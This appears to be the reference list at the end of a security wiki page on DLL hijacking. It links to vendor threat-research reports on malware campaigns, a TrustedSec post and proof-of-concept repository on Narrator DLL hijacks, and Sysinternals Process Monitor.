- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)


{{#include ../../../banners/hacktricks-training.md}}
